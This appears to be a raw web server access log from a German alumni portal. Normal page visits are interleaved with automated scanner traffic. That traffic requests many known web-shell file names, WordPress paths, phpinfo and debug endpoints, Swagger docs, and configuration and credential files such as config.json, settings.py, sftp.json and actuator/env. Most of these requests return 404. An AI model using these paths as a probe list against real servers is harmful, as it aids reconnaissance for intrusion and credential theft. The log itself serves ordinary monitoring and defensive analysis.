2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:41;;/alfa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:42;;/NewFile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:43;;/atomlib.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:44;;/--.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:44;;/system_log.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:45;;/pp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:46;;/geck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:47;;/gm.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:47;;/makeasmtp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:48;;/cccc.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:49;;/file4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:50;;/520.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:51;;/admin.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:51;;/7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:52;;/CLA.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:53;;/file18.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:54;;/ffile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:55;;/file7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:55;;/we.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:56;;/gfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:57;;/jlex3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:58;;/des.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:59;;/aaa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:49:59;;/gifclass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:00;;/vee.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:01;;/efile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:02;;/afile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:03;;/errorfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:03;;/f35.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:04;;/gool.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:05;;/haikh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:06;;/135.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:06;;/enclas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:07;;/ioxi-o.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:08;;/wp-admin/js/wp-conflg.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:09;;/classwithtostring.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:10;;/image.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:10;;/wp-admin/wp-conflg.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:11;;/mail.php?;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:12;;/sx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:13;;/max.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:14;;/size.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:14;;/mpxct.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:15;;/0xx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:16;;/s.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:17;;/hq.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:18;;/blox.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:18;;/ant.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:19;;/fso.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:20;;/htaccess.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:21;;/wp-trackback.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:21;;/wp-admin/about.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:22;;/readme.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:23;;/v.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:24;;/sck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:24;;/X7x.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:25;;/xpass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:26;;/zoz.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:27;;/bless.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:28;;/bless2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:28;;/bless6.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:29;;/bless10.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:30;;/bless11.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:31;;/wp-admin/js/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:31;;/thoms.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:32;;/xcre1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:33;;/xsas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:34;;/xrp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:35;;/wp-freya.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:35;;/jatuh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:36;;/css/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:37;;/file30.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:38;;/fesa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:38;;/class-.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:39;;/.well-known/gecko-litespeed.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:40;;/wp-includes/block-patterns/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:41;;/up.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 02:50:42;;/403.php;GET;404
287fd0ccf7a557496f204c7f1b6155e59e20edad54bf6972a47bd9e1e72b7841;2025-11-02 02:56:17;;/personen/alumni/schule/68457;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-02 03:14:23;;/veranstaltungen;GET;200
92b718a8d965270cbd90245acfdcb4d474958fd761f9d3e9ef2adb608f53725b;2025-11-02 03:15:10;;/personen/alumni/schule/HB0002;GET;200
dc0ccb7173413e3e4051682c0ea9096736c990e8b633ea17089442159fbdd595;2025-11-02 03:34:41;;/personen;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-02 03:35:49;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
017aaf70936d15a0e9408a28f7b6497d333346c49282dbf93ed28ac86c1ed1c6;2025-11-02 03:38:15;;/themen/details/der-start-ins-studium;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-02 03:50:28;/personen/alumni/details/felix-fischer;/personen/alumni/schule/65262;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-02 03:54:30;/;/;GET;200
10aa5b6f6ef3fd6b88d54dc47a0fcae56994f1b80d49d856eac8f494b02317e6;2025-11-02 03:59:43;;/;GET;200
e31e0da11aa9fe82128577fe5a95d87f4ae3158d7b3636766f9b3593c5ea045b;2025-11-02 04:01:36;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
058ca8b56e8fbd2ac9fa340ca203385589f39cc8cb1993f08b102c19557a7457;2025-11-02 04:18:06;;/personen/alumni/schule/164045;GET;200
8a4cc9413d5fdfeb9028c707bc5497a7616581338b51d15491a10a8518082e96;2025-11-02 04:20:47;;/.well-known/assetlinks.json;GET;404
4b0e9389fcfd0c600af4e0694046c102206128284ab51147054b6eee02185081;2025-11-02 04:20:47;;/.well-known/assetlinks.json;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:47;;//wp-includes/ID3/license.txt;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:47;;//feed/;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:48;;//xmlrpc.php?rsd;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:48;;//blog/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:49;;//web/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:49;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:49;;//wp/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:49;;//2020/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:50;;//2019/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:50;;//2021/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:50;;//shop/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:51;;//wp1/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:51;;//test/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:51;;//site/wp-includes/wlwmanifest.xml;GET;404
82faf036182f8dfe59c6b1abb1b8bba263502291ab4875f81dd5d4d9f9a26560;2025-11-02 04:24:51;;//cms/wp-includes/wlwmanifest.xml;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-02 04:26:16;/gruppen/interesse/marktforschung-und-analyse;/gruppen/interesse/marktforschung-und-analyse;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-02 04:29:23;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
09248eae66c0bca6b5d604e1b6055061e36333cb4c0924795fd49a5a7b0266c5;2025-11-02 04:29:34;;/personen/alumni/details/samuel-wright;GET;404
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-02 04:30:03;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:02;;/app_dev.php/_profiler/phpinfo;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:03;;/?phpinfo=-1;GET;200
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:05;;/config.yaml;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:06;;/env.example;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:07;;/config.ini;GET;404
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-02 04:36:08;/gruppen;/gruppen/interesse/strategische-planung;GET;200
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:08;;/test1.php;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:08;;/admin/infophp.php;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:10;;/settings.inc.php;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:13;;/settings.cfg;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:16;;/robomongo.json;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:17;;/config/config.js;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:20;;/settings.py;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:20;;/Admin/test;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:22;;/v1/test;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:23;;/en/test;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:27;;/st/test;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-02 04:36:29;;/Crm;GET;404
71bedc0e94b0bfe809be13fa4f4ea31e1fcd6e431c6bd14369f18a89ce964b96;2025-11-02 04:36:32;;/about/allgemein;GET;200
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-02 04:38:23;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
13b5c3be95531a5194756de5cda53b8f3d3d9fa4c0e0767f66ecfbc01f69d70e;2025-11-02 04:42:25;;/;GET;200
9381a638ea42b11a4f35a59c063f3246cd79bc228a026a3b88a93402f9654231;2025-11-02 04:44:53;/;/;GET;200
93c89b698eca23ca3bfccadf432919a765e547584399e3fd8de94b5b7fbec644;2025-11-02 04:54:48;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
9b6ca062529dd8d317ffb60d959df855d43fde31604820d481f9be5cb6cd8212;2025-11-02 04:56:23;;/aktuelles/stellenangebote;GET;200
ced2d99d35686a84e897f9728aa084f2d179e8ecd40998e5ba37da2f6f21f3a7;2025-11-02 05:02:25;;/owa/auth/x.js;GET;404
05c274b5c7cd65c7db24de5fd987b5284e0caf41bb5f233a71df60921b5b3617;2025-11-02 05:13:02;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b8db669da24e5b0ad67d627581890f9951fb425389cb4a75cd76674e66f5b678;2025-11-02 05:20:37;;/sitemap.html;GET;404
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-02 05:20:58;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
d22d10da15bbaa089cc42129362a5d3dc473986f1dc90667f6d9a284cb3b202d;2025-11-02 05:22:32;;/;GET;200
6b3ffe367c68af4140c556a0a1c2513857b57327f431bc836ae37ff1ee0fc531;2025-11-02 05:25:23;/veranstaltungen/details/wohnzimmerkonzert;/veranstaltungen/details/wohnzimmerkonzert;GET;200
58912e3e1d481906cc846cc600481546721456d4361c1bf63849d5be36afb84f;2025-11-02 05:28:55;;/personen/alumni/schule/MP001;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-02 05:38:59;/gruppen;/gruppen/interesse/it-und-softwareentwicklung;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-02 05:42:23;/personen/alumni/details/thomas-matzig;/gruppen/hobby/gesang;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-02 05:44:23;;/gruppen/interesse/projektmanagement;GET;200
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:42;;/;GET;200
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:42;;/;GET;200
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:44;;/swagger-ui.html;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:44;;/swagger/index.html;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:44;;/swagger/swagger-ui.html;GET;404
9b5fed45974716f8a9f4b6e3a0408bded7ffa21cba461cb68806e316bbf392d1;2025-11-02 05:45:44;;/;GET;200
40186ba9d9b1be57720124434d01864a50ca4a37dc3004a4d6d5200beaef1d9d;2025-11-02 05:45:45;;/;GET;200
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:45;;/webjars/swagger-ui/index.html;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:45;;/swagger.json;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:45;;/swagger/v1/swagger.json;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:45;;/v2/api-docs;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:46;;/v3/api-docs;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:46;;/api-docs/swagger.json;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:46;;/api/swagger.json;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:46;;/@vite/env;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:47;;/actuator/env;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:47;;/server;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:47;;/.vscode/sftp.json;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:47;;/about;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/debug/default/view?panel=config;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/v2/_catalog;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/server-status;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/login.action;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/_all_dbs;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:48;;/.DS_Store;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:49;;/s/7353e2630313e2233313e2231323/_/,/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:49;;/config.json;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:49;;/telescope/requests;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:49;;/info.php;GET;404
c2920e6a35885837450495777f59f54819247089da5ce951758a1e2d66acab4e;2025-11-02 05:45:49;;/?rest_route=/wp/v2/users/;GET;200
eff812a8deb8be1d517bdb117c14e02d315fb0cb1a4515ea31af7663803baadc;2025-11-02 05:45:52;;/;GET;200
9b5fed45974716f8a9f4b6e3a0408bded7ffa21cba461cb68806e316bbf392d1;2025-11-02 05:45:55;;/;GET;200
f786adf6e2612e1311df1bfdba7225cb9c78cc17b35450310ebacacd781918db;2025-11-02 05:47:15;;/;GET;200
cff26ce53111ca353c39247cfb68244884a43c649bf0930aed7cd6de3ca7d524;2025-11-02 05:47:15;;/;GET;200
fe5a185ff38e29d09517aed7c9632a2fc3278791ffaac162a237cde3b61b2e1a;2025-11-02 05:49:03;;/;GET;200
a7b392a27a0ba260e4e9b1cda8e7bc05c12d9595a021def4e270f0814b8338c7;2025-11-02 05:54:34;;/personen;GET;200
fc1c61c38a857a4a016eb3d7052b96f4814204a12a5f6fff2afb973616c8ec42;2025-11-02 05:56:36;;/;GET;200
298c19570a51444d856ed6d6593e6788c56fd80a61aa301d87920a14f8f7c284;2025-11-02 05:57:06;;/;GET;200
298c19570a51444d856ed6d6593e6788c56fd80a61aa301d87920a14f8f7c284;2025-11-02 05:57:21;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
298c19570a51444d856ed6d6593e6788c56fd80a61aa301d87920a14f8f7c284;2025-11-02 05:57:25;;/personen/alumni/schule/5511;GET;200
298c19570a51444d856ed6d6593e6788c56fd80a61aa301d87920a14f8f7c284;2025-11-02 05:57:38;;/rechtliches/datenschutz;GET;200
298c19570a51444d856ed6d6593e6788c56fd80a61aa301d87920a14f8f7c284;2025-11-02 05:57:38;;/ads.txt;GET;404
e1fb85b2923edda27591af2aadd0a2eb80dbc27cb54f3badc1a92d7e6894c88e;2025-11-02 06:01:00;/;/;GET;200
21b3ea1b9f9aa23517d4c5424c958251ca06e69e5d04e2fae67abfa40e968db3;2025-11-02 06:01:02;/;/;GET;200
5d1b9261b4e109ea84b00ab048f7c1def5531edf16e9d832f726c101bf6a1cfb;2025-11-02 06:01:05;/;/;GET;200
7f1bfcd8d7f49440c26c7f5ae01fabbf71d4664fb23ba50ad7c81ac6a9f99f45;2025-11-02 06:01:06;;/;GET;200
e547d8d87491508716b9292bc035bbdeb91f90b5f2deec1331dca94f5d753f30;2025-11-02 06:01:07;/;/;GET;200
16e70ef82ef2ff12fd3be9adbefcaecee1667ed5adbf431387587a03225296dc;2025-11-02 06:02:07;;/;GET;200
16e70ef82ef2ff12fd3be9adbefcaecee1667ed5adbf431387587a03225296dc;2025-11-02 06:02:07;;/;GET;200
16e70ef82ef2ff12fd3be9adbefcaecee1667ed5adbf431387587a03225296dc;2025-11-02 06:02:09;;/;GET;200
3803854f4d43907b1b5e9fe3e86b8decea4834bf4f65d882f6e3fb1c0f4c8157;2025-11-02 06:03:10;;/;GET;200
c3f68df08cccf3ee307562c92a7a07add25f55843c034243a6c178c831b86a2f;2025-11-02 06:03:29;;/.well-known/security.txt;GET;404
7e6133d7db24d065fc6c4de265677aed17fde12e30f5541fe756b130991eae70;2025-11-02 06:06:26;;/+CSCOL+/Java.jar;GET;404
7e6133d7db24d065fc6c4de265677aed17fde12e30f5541fe756b130991eae70;2025-11-02 06:06:26;;/+CSCOE+/logon_forms.js;GET;404
7e6133d7db24d065fc6c4de265677aed17fde12e30f5541fe756b130991eae70;2025-11-02 06:06:27;;/+CSCOL+/a1.jar;GET;404
7e6133d7db24d065fc6c4de265677aed17fde12e30f5541fe756b130991eae70;2025-11-02 06:06:27;;/+CSCOE+/transfer.js;GET;404
5f180a1a78671703bedbb0db07fd88f57144c7c9056c840918ddd890e3cc9a8b;2025-11-02 06:07:07;;/;GET;200
45a911c83ef59590bc86c61f2343142209c3489a0d11a66ce42f76ba850c4a23;2025-11-02 06:07:19;;/;GET;200
b68cf32a747d9724d596cd30771621cea227f214b9165f47985d441517e82b08;2025-11-02 06:08:48;;/;GET;200
6ce0b82056bd88ab55703f789147b1cc44b2306e042cd179a467539a63469f5b;2025-11-02 06:09:31;;/;GET;200
162818d7a6656ffe45f72d293b171f7852edf44eb7b7463f7966fc0632805d02;2025-11-02 06:09:31;;/;GET;200
6ce0b82056bd88ab55703f789147b1cc44b2306e042cd179a467539a63469f5b;2025-11-02 06:09:37;;/;GET;200
8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-02 06:10:18;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
